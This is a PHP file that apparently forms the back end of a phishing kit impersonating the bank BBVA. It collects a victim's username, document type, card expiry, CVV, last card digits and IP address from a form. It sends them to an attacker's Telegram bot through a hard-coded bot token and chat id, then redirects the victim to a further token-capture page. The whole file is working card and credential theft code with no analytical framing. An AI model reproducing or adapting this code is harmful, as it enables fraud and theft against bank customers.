<?php
session_start();

// Verifica si la variable de sesión 'username' está definida
if (isset($_SESSION['username'])) {
    $username = $_SESSION['username'];
} else {
    echo "No se ha definido el nombre de usuario en la sesión.";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Sanitizar datos del formulario usando htmlspecialchars()
    $tipoDoc = htmlspecialchars($_POST['tipodoc'], ENT_QUOTES, 'UTF-8');
    $numdoc = htmlspecialchars($_POST['numdoc'], ENT_QUOTES, 'UTF-8');
    $cvv = htmlspecialchars($_POST['cvv'], ENT_QUOTES, 'UTF-8');
    $ulti = htmlspecialchars($_POST['lastDoc'], ENT_QUOTES, 'UTF-8');

    // Mensaje a enviar
    $ip = $_SERVER['REMOTE_ADDR'];
    $botToken = '7784321740:AAFShKdl2ALYn7cYPdc--sUoYRd7un2NZPw';
    $chatId = '7414408766';
    $text = "BBVA | $username\n----\nTipo: $tipoDoc\nFECHA: $numdoc\nCVV: $cvv\nULTIMOS 3 DIGITOS: $ulti\nIP: $ip";
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    // Enviar la solicitud HTTP GET a la API de Telegram usando cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Comprobar si el mensaje fue enviado exitosamente
    if ($response) {
        header("Location: ../token.html");
        exit; // Asegúrate de llamar a exit después de redirigir
    } else {
        echo "Error al enviar el mensaje.";
    }
} else {
    die('Método de solicitud no permitido.');
}
?>
